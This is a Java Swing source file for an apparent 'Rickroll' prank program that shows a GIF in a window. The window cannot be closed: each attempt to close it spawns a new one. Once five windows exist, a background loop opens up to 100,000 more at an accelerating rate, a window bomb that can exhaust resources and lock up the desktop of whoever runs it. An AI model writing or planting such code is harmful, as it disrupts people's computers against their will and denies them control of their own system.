package com.company;

import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

public class Rickrick extends JFrame {
   public Rickrick() {
      setTitle("Rick go brrr - the music is not even synced HA");
      setResizable(false);

      JLabel gif = new JLabel(Main.gif);
      add(gif);

      setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
      addWindowListener( new WindowAdapter() {
         public void windowClosing(WindowEvent e) {
            new Rickrick();
         }
      });

      pack();
      java.util.Random rn = new java.util.Random();
      setLocation(
              rn.nextInt(Toolkit.getDefaultToolkit().getScreenSize().width - getWidth()),
              rn.nextInt(Toolkit.getDefaultToolkit().getScreenSize().height - getHeight())
      );
      setVisible(true);

      if (!Main.blocked)
         Main.count++;

      if (Main.count >= 5 && !Main.blocked) {
         Main.blocked = true;
         new SwingWorker<>() {
            @Override
            protected Object doInBackground() throws Exception {
               int step = 500;
               for (int i = 0; i < 100_000; i++) {
                  new Rickrick();
                  Thread.sleep(step);
                  if (step >= 45)
                     step -= 45;
                  else
                     step = 0;
               }
               return null;
            }
         }.execute();
      }
   }
}
